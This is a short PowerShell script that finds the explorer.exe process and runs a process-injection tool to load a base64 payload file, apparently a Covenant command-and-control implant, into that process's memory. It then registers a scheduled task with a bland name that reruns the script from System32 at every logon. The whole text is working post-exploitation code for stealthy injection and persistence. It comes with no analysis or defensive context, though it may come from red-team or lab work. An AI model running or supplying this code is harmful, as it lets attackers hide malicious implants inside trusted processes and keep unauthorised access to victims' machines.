# Get PID of first occurence of explorer.exe
$procid=(get-process explorer).id | Select-Object -First 1

# Inject Payload into Memory
C:\Users\Administrator\ProcessInjection\ProcessInjection\bin\Debug\ProcessInjection.exe /pid:$procid /path:C:\Users\Administrator\Downloads\covenant.txt /f:base64 /t:1

# Ensure this script runs on boot with a scheduled task. Note system32 is where this script is located
schtasks /create /tn "MyCustomTask" /sc onlogon /tr "start /B C:\Windows\System32\InjectPayloadtoMemoryOnboot.ps1"
